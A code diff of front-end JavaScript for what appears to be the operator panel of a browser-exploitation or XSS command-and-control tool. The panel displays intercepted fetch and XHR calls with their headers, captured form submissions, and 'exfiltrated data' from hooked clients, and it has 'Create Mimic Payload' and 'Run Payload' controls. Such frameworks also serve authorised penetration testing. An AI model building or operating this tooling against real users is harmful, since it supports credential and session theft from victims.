+  		cardText.innerHTML += `&nbsp;<button type="button" class="btn btn-primary" onclick="showMimicApiModal('${eventKey}', '${jsonDataString}', 'XHR')">Create Mimic Payload</button>`;
   	}
   	break;
 
-  case 'FETCHSETUP':
+
+  case 'FETCHAPICALL':
   	if (document.getElementById('apiEvents').checked == true)
   	{
   		activeEvent = true;
-  		fetchSetupReq  = await fetch('/api/clientFetchSetup/' + eventKey);
-  		fetchSetupJson = await fetchSetupReq.json();
+  		fetchApiCallReq  = await fetch('/api/clientFetchApiCall/' + eventKey);
+  		fetchApiCallJson = await fetchApiCallReq.json();
 
-  		cardTitle.innerHTML = "API - Fetch Setup";
-  		cardText.innerHTML  = "URL: <b>" + fetchSetupJson.url + "</b>";
+
+  		cardTitle.innerHTML = "Network - Fetch API Call";
+
+  		// Show basics
+  		cardText.innerHTML  = "URL: <b>" + fetchApiCallJson.url + "</b>";
   		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "Method: <b>" + fetchSetupJson.method + "</b>";
-  	}
-  	break;
-
-  case 'FETCHHEADER':
-  	if (document.getElementById('apiEvents').checked == true)
-  	{
-  		activeEvent = true;
-  		fetchHeaderReq  = await fetch('/api/clientFetchHeader/' + eventKey);
-  		fetchHeaderJson = await fetchHeaderReq.json();
-
-  		cardTitle.innerHTML = "API - Fetch Header";
-  		cardText.innerHTML  = "Header: <b>" + fetchHeaderJson.header + "</b>";
+  		cardText.innerHTML += "Method: <b>" + fetchApiCallJson.method + "</b>";
   		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "Value: <b>" + fetchHeaderJson.value + "</b>";
-  	}
-  	break;
+  		cardText.innerHTML += "<br>";
+  		cardText.innerHTML += "Headers:";
+  		cardText.innerHTML += "<br>";
 
-  case 'FETCHCALL':
-  	if (document.getElementById('apiEvents').checked == true)
-  	{
-  		activeEvent = true;
+  		fetchApiCallJson.headers.forEach(header => {
+  			cardText.innerHTML += "<b>" + escapeHTML(header.header) + ":" + escapeHTML(header.value) + "</b>";
+  			cardText.innerHTML += "<br>";
+  		});
 
-  		cardTitle.innerHTML = "API - Fetch Call";
+  		cardText.innerHTML += "<br>";
+  		cardText.innerHTML += "Response Status: <b>" + fetchApiCallJson.responseStatus + "</b>";
+
+  		cardText.innerHTML += "<br>";
+  		cardText.innerHTML += "<br>";
+
   		cardText.innerHTML += '<br><button type="button" class="btn btn-primary" onclick=showReqRespViewer(' 
   		+ eventKey + ',"FETCH")>View API Call</button>';
+
+  		jsonDataString = JSON.stringify(fetchApiCallJson).replace(/"/g, '&quot;');
+  		cardText.innerHTML += `&nbsp;<button type="button" class="btn btn-primary" onclick="showMimicApiModal('${eventKey}', '${jsonDataString}', 'FETCH')">Create Mimic Payload</button>`;
   	}
   	break;
+
+
 
   case 'FORMPOST':
   	if (document.getElementById('formPostEvents').checked == true)
@@ -1294,24 +2033,42 @@ async function getClientDetails(id)
   		formPostReq  = await fetch('/api/clientFormPosts/' + eventKey);
   		formPostJson = await formPostReq.json();
 
-  		formData        = escapeHTML(atob(formPostJson.data));
+  		formData       = escapeHTML(atob(formPostJson.data));
   		splitFormData  = formData.split('\n');
 
-  		cardTitle.innerHTML = "Form Submission";
+  		cardTitle.innerHTML = "Network Form Submission";
+  		cardText.innerHTML += "URL: <b>" + escapeHTML(formPostJson.url) + "</b>";
+  		cardText.innerHTML += "<br>";
   		cardText.innerHTML += "Action: <b>" + escapeHTML(atob(formPostJson.action)) + "</b>";
   		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "Method: <b>" + formPostJson.method + "</b>";
-   		cardText.innerHTML += "<br>";
+  		cardText.innerHTML += "Method: <b>" + escapeHTML(formPostJson.method) + "</b>";
+  		cardText.innerHTML += "<br>";
   		cardText.innerHTML += "Data:";
-  	  	cardText.innerHTML += "<br>";
+  		cardText.innerHTML += "<br>";
+  		cardText.innerHTML += splitFormData.map(line => "<b>" + line + "</b>").join("<br>");
+  		cardText.innerHTML += "<br>";
 
-  	  	cardText.innerHTML += splitFormData.map(line => "<b>" + line + "</b>").join("<br>");
+  		jsonDataString = JSON.stringify(formPostJson).replace(/"/g, '&quot;');
+  		cardText.innerHTML += `<button type="button" class="btn btn-primary" onclick="showMimicFormModal('${eventKey}', '${jsonDataString}')">Create Mimic Payload</button>`;
+  	}
+  	break;
 
 
-  	  	// for (line of splitFormData)
-  	  	// {
-  	  	// 	cardText.innerHTML += "<b>" + line + "</b><br>";
-  	  	// }
+  case 'CUSTOMEXFIL':
+  	if (document.getElementById('customExfilEvents').checked == true)
+  	{
+  		activeEvent = true;
+
+  		// fetch the data from the api
+  		customExfilReq  = await fetch('/api/clientCustomExfilNote/' + eventKey);
+  		customExfilJson = await customExfilReq.json();
+
+  		note = escapeHTML(atob(customExfilJson.note));
+
+  		cardTitle.innerHTML = "Custom Payload Exfiltrated Data";
+  		cardText.innerHTML += "Note: <br>";
+  		cardText.innerHTML += "<b>" + note + "</b><br><br>";
+  		cardText.innerHTML += '<button type="button" class="btn btn-primary" onclick="showExfilViewer(' + eventKey + ')">View Exfiltrated Data</button>';
   	}
   	break;
 
@@ -1592,7 +2349,7 @@ async function updateClients()
 
   cardText.innerHTML  = "IP:<b>&nbsp;&nbsp;&nbsp;" + client.ip + "</b>";
 
-		//What to do about client notes?
+	//What to do about client notes?
   if (client.notes.length > 0)
   {
   	cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;" onclick=showNoteEditor(event,' + `'` 
@@ -1609,13 +2366,13 @@ async function updateClients()
 
   if (client.hasJobs)
   {
-	  cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;border-width:2px;border-color:green" onclick=showSingleClientPayloadModal(event,' + `'` 
-	  + client.id + `'`+ ')>Run Payload</button>';  
-	}	
+  	cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;border-width:2px;border-color:green" onclick=showSingleClientPayloadModal(event,' + `'` 
+  	+ client.id + `'`+ ')>Run Payload</button>';  
+  }	
   else
   {
-	  cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;" onclick=showSingleClientPayloadModal(event,' + `'` 
-	  + client.id + `'`+ ')>Run Payload</button>';
+  	cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;" onclick=showSingleClientPayloadModal(event,' + `'` 
+  	+ client.id + `'`+ ')>Run Payload</button>';
   }
 
 
